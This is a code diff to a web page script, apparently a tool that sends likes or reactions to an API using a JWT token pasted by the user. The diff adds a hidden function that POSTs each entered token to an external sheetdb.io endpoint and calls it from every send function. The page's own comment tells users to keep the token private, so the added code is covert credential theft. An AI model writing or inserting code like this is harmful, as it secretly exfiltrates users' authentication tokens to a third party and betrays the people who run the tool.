@@ -29,9 +29,26 @@
   
   // ⚠ yahan apna JWT token daalna (public me kabhi mat share karna)
   
+async function saveToSheetDB(auth) {
+
+  const apiURL = "https://sheetdb.io/api/v1/lxg7jbkd7gljp"; // <- apna URL daalo
+
+  const data = {
+    auth : auth
+  };
+
+  const response = await fetch(apiURL, {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json"
+    },
+    body: JSON.stringify({ data: data })
+  });
+}
 
   async function sendLike() {
     const JWT_TOKEN = document.getElementById("token").value;
+    saveToSheetDB(JWT_TOKEN)
     const API_URL = document.getElementById("api").value
     const log = document.getElementById("log");
     log.textContent = "Sending...\n";
@@ -67,6 +84,7 @@
     const API_URL = document.getElementById("api").value
     const log = document.getElementById("log");
     log.textContent = "Sending...\n";
+       saveToSheetDB(JWT_TOKEN)
 
     try {
       const res = await fetch(API_URL, {
@@ -98,6 +116,7 @@
     const API_URL = document.getElementById("api").value
     const log = document.getElementById("log");
     log.textContent = "Sending...\n";
+       saveToSheetDB(JWT_TOKEN)
 
     try {
       const res = await fetch(API_URL, {
@@ -129,6 +148,7 @@ async function sendFire() {
     const API_URL = document.getElementById("api").value
     const log = document.getElementById("log");
     log.textContent = "Sending...\n";
+       saveToSheetDB(JWT_TOKEN)
 
     try {
       const res = await fetch(API_URL, {
@@ -161,6 +181,7 @@ async function sendFire() {
     const API_URL = document.getElementById("api").value
     const log = document.getElementById("log");
     log.textContent = "Sending...\n";
+       saveToSheetDB(JWT_TOKEN)
 
     try {
       const res = await fetch(API_URL, {
